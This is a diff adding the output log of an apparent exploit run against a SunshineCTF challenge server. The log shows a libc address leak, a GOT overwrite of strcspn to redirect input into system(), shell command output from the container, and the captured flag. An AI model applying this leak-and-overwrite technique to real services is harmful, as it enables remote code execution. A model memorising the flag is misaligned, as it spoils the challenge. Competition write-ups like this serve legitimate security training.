@@ -1,0 +1,44 @@
+[*] mode      : REMOTE chal.sunshinectf.games:26002
+[*] target libc: libc6_2.39-0ubuntu8.3 (Ubuntu 24.04)
+[x] Opening connection to chal.sunshinectf.games on port 26002
+[x] Opening connection to chal.sunshinectf.games on port 26002: Trying 35.211.211.18
+[+] Opening connection to chal.sunshinectf.games on port 26002: Done
+[*] code probe @0x4010d0 = f30f1efa4154ba1f
+[+] setvbuf@libc = 0x75ad20b55540   ->   libc base = 0x75ad20acd000
+[*] &_IO_2_1_stdout_ = 0x75ad20cd15c0 (base+0x2045c0)
+[+] system = 0x75ad20b25740
+[+] strcspn@got overwritten -> main() runs system(buf) on the next line
+sun{cust0m_fmtstr_n0_t00ls_4ll0wed}
+total 12
+drwxr-xr-x 2 root root       4096 Sep 26 00:21 .
+drwxr-xr-x 1 root root       4096 Sep 26 00:54 ..
+-rw-r----- 1 root revolution   36 Sep 26 00:13 flag.txt
+total 60
+drwxr-xr-x   1 root root 4096 Sep 26 00:54 .
+drwxr-xr-x   1 root root 4096 Sep 26 00:54 ..
+-rwxr-xr-x   1 root root    0 Sep 26 00:54 .dockerenv
+lrwxrwxrwx   1 root root    7 Apr 22  2024 bin -> usr/bin
+drwxr-xr-x   2 root root 4096 Apr 22  2024 boot
+drwxr-xr-x   2 root root 4096 Sep 26 00:21 ctf
+drwxr-xr-x   5 root root  360 Sep 26 00:54 dev
+drwxr-xr-x   1 root root 4096 Sep 26 00:54 etc
+drwxr-xr-x   1 root root 4096 Sep 24 06:35 home
+lrwxrwxrwx   1 root root    7 Apr 22  2024 lib -> usr/lib
+lrwxrwxrwx   1 root root    9 Apr 22  2024 lib64 -> usr/lib64
+drwxr-xr-x   2 root root 4096 Oct  9  2024 media
+drwxr-xr-x   2 root root 4096 Oct  9  2024 mnt
+drwxr-xr-x   2 root root 4096 Oct  9  2024 opt
+dr-xr-xr-x 320 root root    0 Sep 26 00:54 proc
+drwx------   1 root root 4096 Oct 14  2024 root
+drwxr-xr-x   4 root root 4096 Oct  9  2024 run
+lrwxrwxrwx   1 root root    8 Apr 22  2024 sbin -> usr/sbin
+drwxr-xr-x   2 root root 4096 Oct  9  2024 srv
+dr-xr-xr-x  13 root root    0 Sep 26 13:53 sys
+drwxrwxrwt   2 root root 4096 Oct  9  2024 tmp
+drwxr-xr-x   1 root root 4096 Oct  9  2024 usr
+drwxr-xr-x   1 root root 4096 Oct  9  2024 var
+uid=1337(revolution) gid=1337(revolution) groups=1337(revolution)
+DONE
+
+FLAG: sun{cust0m_fmtstr_n0_t00ls_4ll0wed}
+[*] Closed connection to chal.sunshinectf.games port 26002
